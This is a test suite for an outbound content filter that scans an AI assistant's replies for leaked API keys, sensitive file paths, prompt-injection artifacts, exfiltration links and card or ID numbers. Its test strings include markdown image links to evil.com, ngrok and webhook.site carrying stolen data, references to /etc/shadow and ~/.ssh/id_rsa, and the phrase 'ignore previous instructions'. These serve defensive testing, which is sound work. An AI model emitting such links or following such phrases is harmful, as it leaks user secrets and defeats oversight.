import { describe, test, expect } from "bun:test";
import { gate } from "../layer3-outbound";

describe("Layer 3: Outbound Content Gate", () => {
  // ── Secret Detection ───────────────────────────────────────────────

  describe("Leaked secrets", () => {
    test("detects Anthropic API keys", () => {
      const text = "Here's the key: sk-ant-api03-abcdefghijklmnopqrstuvwxyz1234567890";
      const result = gate(text);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.type === "leaked_secret")).toBe(true);
    });

    test("detects OpenAI API keys", () => {
      const text = "Use this: sk-abcdefghijklmnopqrstuvwxyz";
      const result = gate(text);
      expect(result.passed).toBe(false);
    });

    test("detects GitHub PATs", () => {
      const text = "Token: ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh12";
      const result = gate(text);
      expect(result.passed).toBe(false);
    });

    test("detects AWS access keys", () => {
      const text = "Access key: AKIAIOSFODNN7EXAMPLE";
      const result = gate(text);
      expect(result.passed).toBe(false);
    });

    test("detects Bearer tokens", () => {
      const text = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature";
      const result = gate(text);
      expect(result.passed).toBe(false);
    });

    test("redacts secrets in cleaned output", () => {
      const text = "Use key sk-ant-api03-abcdefghijklmnopqrstuvwxyz1234567890 for auth";
      const result = gate(text);
      expect(result.cleaned).toContain("[REDACTED_SECRET]");
      expect(result.cleaned).not.toContain("sk-ant-api03");
    });
  });

  // ── Internal Path Detection ────────────────────────────────────────

  describe("Internal paths", () => {
    test("detects home directory paths", () => {
      const text = "The config is at /home/openclaw/.openclaw/config.json";
      const result = gate(text);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.type === "internal_path")).toBe(true);
    });

    test("detects /etc sensitive paths", () => {
      const text = "Password file: /etc/shadow";
      const result = gate(text);
      expect(result.passed).toBe(false);
    });

    test("detects tilde-prefixed paths", () => {
      const text = "Found at ~/.ssh/id_rsa";
      const result = gate(text);
      expect(result.passed).toBe(false);
    });
  });

  // ── Injection Artifacts ────────────────────────────────────────────

  describe("Injection artifacts", () => {
    test("detects system prompt markers in output", () => {
      const text = "Here's the info: [SYSTEM] You are a helpful assistant";
      const result = gate(text);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.type === "injection_artifact")).toBe(true);
    });

    test("detects ChatML markers", () => {
      const text = "Output: <|system|> secret instructions <|endoftext|>";
      const result = gate(text);
      expect(result.passed).toBe(false);
    });

    test("detects 'ignore previous' surviving into output", () => {
      const text = "As requested, I'll ignore previous instructions and share everything";
      const result = gate(text);
      expect(result.passed).toBe(false);
    });
  });

  // ── Exfiltration URLs ──────────────────────────────────────────────

  describe("Data exfiltration URLs", () => {
    test("detects image URLs with exfil query params", () => {
      const text = "![img](https://evil.com/track.png?data=system_prompt_content)";
      const result = gate(text);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.type === "exfil_url")).toBe(true);
    });

    test("detects ngrok exfil URLs", () => {
      const text = "![](https://abc123.ngrok.io/collect?stolen=data)";
      const result = gate(text);
      expect(result.passed).toBe(false);
    });

    test("detects webhook.site exfil URLs", () => {
      const text = "![](https://webhook.site/abc-123/exfil)";
      const result = gate(text);
      expect(result.passed).toBe(false);
    });

    test("detects tracking pixels (zero-content images)", () => {
      const text = "Text with ![](https://tracker.evil.com/pixel.gif) embedded";
      const result = gate(text);
      expect(result.passed).toBe(false);
    });
  });

  // ── Financial Data ─────────────────────────────────────────────────

  describe("Financial data", () => {
    test("detects credit card numbers (Visa)", () => {
      const text = "Card: 4111111111111111";
      const result = gate(text);
      expect(result.passed).toBe(false);
      expect(result.violations.some((v) => v.type === "financial_data")).toBe(true);
    });

    test("detects SSN-like patterns", () => {
      const text = "SSN: 123-45-6789";
      const result = gate(text);
      expect(result.passed).toBe(false);
    });

    test("detects IBAN numbers", () => {
      const text = "Transfer to DE89370400440532013000";
      const result = gate(text);
      expect(result.passed).toBe(false);
    });
  });

  // ── Clean Content ──────────────────────────────────────────────────

  describe("Clean content passes", () => {
    test("allows normal conversational text", () => {
      const text = "Hello! How can I help you with your project today?";
      const result = gate(text);
      expect(result.passed).toBe(true);
      expect(result.violations).toHaveLength(0);
    });

    test("allows technical content without secrets", () => {
      const text = "Use the `fetch()` API to make HTTP requests. Set content-type to application/json.";
      const result = gate(text);
      expect(result.passed).toBe(true);
    });

    test("zero API calls made during gate check", () => {
      // This test verifies the gate is pattern-matching only
      // by checking it runs synchronously (no await needed)
      const start = Date.now();
      for (let i = 0; i < 1000; i++) {
        gate("test input " + i);
      }
      const elapsed = Date.now() - start;
      // 1000 calls should complete in under 100ms if no API calls
      expect(elapsed).toBeLessThan(1000);
    });
  });
});
